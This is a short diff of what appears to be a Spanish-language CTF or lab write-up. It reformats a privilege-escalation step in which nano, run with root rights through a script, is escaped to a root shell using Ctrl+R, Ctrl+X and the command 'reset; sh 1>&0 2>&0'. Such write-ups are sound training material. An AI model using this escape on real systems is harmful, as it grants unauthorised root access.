@@ -89,10 +89,10 @@ el usuario mike tiene permisos root para el script rootkit.sh usaremos esto para
 
 usaremos la opcion numero 4 (read) esto nos permite editar el archivo 
 ![[Pasted image 20240112231008.png]]
+
 ```python
-```
 nano
-^R^X
-reset; sh 1>&0 2>&0
-```
+- Ctrl^R 
+- reset; sh 1>&0 2>&0
+- Ctrl^X
 ```
